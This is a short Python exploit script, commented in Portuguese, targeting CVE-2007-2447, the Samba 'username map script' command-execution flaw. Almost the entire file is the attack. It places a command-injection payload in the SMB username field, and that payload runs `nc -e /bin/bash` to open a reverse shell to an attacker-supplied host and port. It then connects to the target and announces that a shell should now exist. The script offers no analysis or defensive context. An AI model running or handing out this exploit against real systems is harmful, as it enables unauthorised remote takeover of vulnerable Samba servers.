import sys
from smb.SMBConnection import SMBConnection

# Verifica se o número de argumentos é correto
if len(sys.argv) != 5:
    print("* CVE-2007-2447 | Samba 3.0.20 < 3.0.25rc 'Username' map script' Command Execution *\n")
    print("Uso: python3 exploit.py <rhost> <rport> <lhost> <lport>")
    print("Exemplo: python3 exploit.py 10.10.10.10 139 127.0.0.1 4444")
    sys.exit()

# Obtém os argumentos da linha de comando
rhost = sys.argv[1]
rport = sys.argv[2]
lhost = sys.argv[3]
lport = sys.argv[4]

# Define o payload para execução remota de comando
username = f"/=`nohup nc -e /bin/bash {lhost} {lport}`"

# Cria uma conexão SMB com o payload como nome de usuário
conn = SMBConnection(username, '', '', '')

try:
    print("[...] Enviando payload")
    conn.connect(rhost, rport, timeout=10)
except Exception as e:
    print("[ + ] Deve ter obtido um shell agora.")
    sys.exit(e)
